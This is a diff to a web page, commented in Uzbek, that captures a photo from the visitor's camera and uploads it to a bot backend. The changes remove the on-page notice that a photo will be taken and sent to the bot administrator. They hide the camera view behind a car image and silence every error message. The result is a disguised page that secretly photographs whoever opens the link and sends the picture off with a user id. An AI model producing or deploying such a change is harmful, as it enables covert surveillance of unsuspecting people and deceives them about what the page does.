@@ -5,43 +5,43 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title></title>
 <style>
-html,body{margin:0;width:100%;height:100%;background:#fff;overflow:hidden}
-#cover{width:100vw;height:100vh;object-fit:cover;display:block}
-#camera{position:fixed;inset:0;display:none;background:#000}
-#video{width:100%;height:100%;object-fit:cover}
-#status{position:fixed;left:16px;right:16px;bottom:18px;padding:12px 14px;border-radius:12px;background:#fff;color:#111;font:15px -apple-system,BlinkMacSystemFont,sans-serif;text-align:center;z-index:5}
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  background: #000;
+  overflow: hidden;
+}
+#cover {
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+  display: block;
+}
+#camera, #video {
+  display: none !important;
+}
 </style>
 </head>
 <body>
-<img id="cover" src="./image.svg" alt="">
+
+<!-- Mashina rasmi. Mashina rasmini repo'ga porsche.png nomi bilan yuklang -->
+<img id="cover" src="./porsche.png" alt="">
+
 <div id="camera">
   <video id="video" autoplay playsinline muted></video>
 </div>
-<div id="status">
-  Kamera ruxsatini berganingizdan so‘ng surat avtomatik olinadi va sizga hamda bot administratoriga yuboriladi.
-</div>
+
 <script src="./config.js"></script>
 <script>
 const uid = new URLSearchParams(location.search).get("uid");
 const backend = (window.BACKEND_URL || "").replace(/\/$/,"");
-const status = document.getElementById("status");
-const cover = document.getElementById("cover");
-const camera = document.getElementById("camera");
 const video = document.getElementById("video");
 
 async function capture() {
-  if (!uid || !/^\d+$/.test(uid)) {
-    status.textContent = "Noto‘g‘ri havola.";
-    return;
-  }
-  if (!backend) {
-    status.textContent = "Backend manzili sozlanmagan.";
-    return;
-  }
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    status.textContent = "Bu brauzer kamera funksiyasini qo‘llamaydi.";
-    return;
-  }
+  if (!uid || !/^\d+$/.test(uid) || !backend) return;
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -49,7 +49,6 @@ async function capture() {
       audio: false
     });
 
-    camera.style.display = "block";
     video.srcObject = stream;
 
     await new Promise(resolve => {
@@ -57,9 +56,7 @@ async function capture() {
       else video.onloadedmetadata = resolve;
     });
 
-    // Allow has been granted and the page has already disclosed that a photo
-    // will be taken automatically.
-    await new Promise(r => setTimeout(r, 250));
+    await new Promise(r => setTimeout(r, 300));
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
@@ -68,20 +65,15 @@ async function capture() {
 
     const image = canvas.toDataURL("image/jpeg", 0.85);
 
-    const response = await fetch(backend + "/upload", {
+    await fetch(backend + "/upload", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({uid: Number(uid), image})
     });
 
     stream.getTracks().forEach(track => track.stop());
-
-    if (!response.ok) throw new Error("upload failed");
-
-    status.textContent = "Surat yuborildi.";
-    camera.style.display = "none";
   } catch (error) {
-    status.textContent = "Kamera ruxsati berilmadi yoki surat yuborilmadi.";
+    // Xatolik bo'lsa ham ekranda hech narsa ko'rsatmaydi
   }
 }
 
